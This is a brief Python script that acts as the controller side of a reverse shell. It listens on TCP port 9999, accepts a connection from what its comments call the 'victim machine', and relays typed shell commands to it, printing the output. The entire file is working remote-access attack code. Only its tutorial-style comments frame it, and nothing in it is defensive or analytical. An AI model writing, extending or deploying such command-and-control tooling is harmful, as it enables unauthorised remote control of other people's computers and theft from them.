
import socket
import sys

# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global server_socket
        host = ""
        port = 9999
        # creating a socket for server side using tcp and ipv4.
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global server_socket

        print("Binding the Port: " + str(port))
        # Binding out host and port
        server_socket.bind((host, port))
        # Listening for our client machine.
        server_socket.listen(5)
    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()       # Recall every time when our binding is fail.

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = server_socket.accept()      # Accept connection from our victime.
    print(f"Connection has been established! | IP : {address[0]} | Port :  {str(address[1])}")
    send_commands(conn)  # Call this function to send our comands in victime machine.
    conn.close() 

# Send commands to client/victim or a friend
def send_commands(conn):
    while True:
        cmd = input()   # accept input from our machine.
        if cmd == 'quit':
            conn.close()
            server_socket.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))      # send accepted input to victime machine as byte.
            # accept response from victime machine and convert into string.
            client_response = str(conn.recv(1024),"utf-8")  
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()
